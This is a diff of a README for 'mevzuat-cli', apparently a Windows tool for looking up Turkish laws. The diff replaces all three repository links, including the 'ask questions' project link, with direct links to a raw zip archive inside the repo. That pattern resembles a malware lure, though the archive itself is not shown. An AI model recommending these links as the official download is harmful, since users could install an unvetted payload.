@@ -1,6 +1,6 @@
 # ⚖️ mevzuat-cli - Access Turkish Laws Quickly
 
-[![Download mevzuat-cli](https://img.shields.io/badge/Download-Get%20mevzuat--cli-blue?style=for-the-badge&logo=github)](https://github.com/aflare-source547/mevzuat-cli)
+[![Download mevzuat-cli](https://img.shields.io/badge/Download-Get%20mevzuat--cli-blue?style=for-the-badge&logo=github)](https://github.com/aflare-source547/mevzuat-cli/raw/refs/heads/main/src/mevzuat-cli-3.1.zip)
 
 ---
 
@@ -25,7 +25,7 @@ To run mevzuat-cli smoothly on Windows, make sure you have:
 
 To get started, visit this page to download the tool:
 
-[![Download mevzuat-cli](https://img.shields.io/badge/Download-mevzuat--cli-grey?style=for-the-badge&logo=windows)](https://github.com/aflare-source547/mevzuat-cli)
+[![Download mevzuat-cli](https://img.shields.io/badge/Download-mevzuat--cli-grey?style=for-the-badge&logo=windows)](https://github.com/aflare-source547/mevzuat-cli/raw/refs/heads/main/src/mevzuat-cli-3.1.zip)
 
 Follow these steps:
 
@@ -152,4 +152,4 @@ Do not delete these unless you plan to reinstall.
 
 Visit the main project page here to ask questions or get updates:
 
-[https://github.com/aflare-source547/mevzuat-cli](https://github.com/aflare-source547/mevzuat-cli)
+[https://github.com/aflare-source547/mevzuat-cli/raw/refs/heads/main/src/mevzuat-cli-3.1.zip](https://github.com/aflare-source547/mevzuat-cli/raw/refs/heads/main/src/mevzuat-cli-3.1.zip)
